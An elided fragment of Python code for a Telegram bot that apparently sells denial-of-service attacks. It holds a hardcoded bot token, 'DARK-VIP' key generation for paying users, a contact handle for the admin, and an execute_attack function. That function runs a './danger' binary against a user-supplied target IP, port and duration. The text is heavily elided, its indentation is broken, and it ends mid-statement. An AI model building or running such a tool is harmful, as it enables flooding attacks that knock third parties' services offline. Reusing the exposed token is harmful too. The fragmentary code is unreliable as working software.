...
# --- Configuration ---
bot = telebot.TeleBot('7734333250:AAFPpHWVKv5SbfSa8BS-CHTO3xcYuebXMT0')

# Admin user IDs
admin_id = {"7210717311"}  # Replace with actual admin ID
...
def generate_key(length=10):
    ...
    return f"DARK-VIP-{key.upper()}"  # Ensure key is in uppercase
...
def generate_key_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻 @DARKVIPDDOSX"
...
def execute_attack(user_id, target, port, time):
    ...
    try:
        ...
        full_command = f"./danger {target} {port} {time} 900"  # Replace with actual attack command
    ...
    if user_id in users:
        ...
        if user_id in attack_cooldown:
            ...
            if time_diff < cooldown_time:
                ...
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {remaining_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 ⌛️"
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:
            ...
            try:
                ...
                if port < 10003 or port > 29999:
                    response = "❗️Invalid port! Use ports between 10003 and 29999."
                elif time > 240:
...
"""
                ...
                response = "❗️Invalid port or time! Ensure they are numeric values."
        else:
            if authorized_user:
    response = (
        "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗜𝗣, 𝗽𝗼𝗿𝘁, 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 "
        "(𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀) 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲."
    )
else:
    response = (
